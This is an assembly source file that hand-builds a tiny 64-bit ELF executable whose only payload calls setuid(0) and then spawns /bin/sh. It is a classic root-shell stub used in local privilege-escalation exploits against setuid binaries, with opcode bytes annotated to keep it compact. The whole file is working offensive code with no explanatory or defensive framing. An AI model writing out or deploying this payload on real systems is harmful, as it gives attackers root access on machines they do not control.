BITS 64
org 0x400000

; --- 64-bit ELF Header ---
ehdr:
    db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
    dw 2            ; e_type: Executable
    dw 0x3e         ; e_machine: x86-64
    dd 1            ; e_version
    dq _start       ; e_entry
    dq phdr - ehdr  ; e_phoff (offset to program header)
    dq 0            ; e_shoff
    dd 0            ; e_flags
    dw 64           ; e_ehsize (ELF header size)
    dw 56           ; e_phentsize (Program header size)
    dw 1            ; e_phnum (Number of program headers)
    dw 0            ; e_shentsize
    dw 0            ; e_shnum
    dw 0            ; e_shstrndx

; --- Program Header (PT_LOAD) ---
phdr:
    dd 1            ; p_type: PT_LOAD
    dd 5            ; p_flags: PF_R | PF_X (Read + Execute)
    dq 0            ; p_offset
    dq 0x400000     ; p_vaddr
    dq 0x400000     ; p_paddr
    dq file_end - ehdr ; p_filesz
    dq file_end - ehdr ; p_memsz
    dq 0x1000       ; p_align

; --- Payload ---
_start:
    ; setuid(0)
    xor    eax, eax
    xor    edi, edi
    mov    al, 0x69
    syscall

    ; execve("/bin/sh", NULL, NULL)
    lea     rdi, [rel sh]       ; 48 8d 3d 0f 00 00 00    rdi -> "/bin/sh"
    xor     esi, esi            ; 31 f6                   rsi = 0 (argv = NULL)
    push    0x3b                ; 6a 3b                   push SYS_execve
    pop     rax                 ; 58                      rax = 59
    cdq                         ; 99                      rdx = 0 (envp = NULL)
    syscall                     ; 0f 05                   execve("/bin/sh", 0, 0)

    ; exit(0)
    xor    edi, edi
    push   0x3c
    pop    rax
    syscall

sh:  db "/bin/sh", 0

file_end: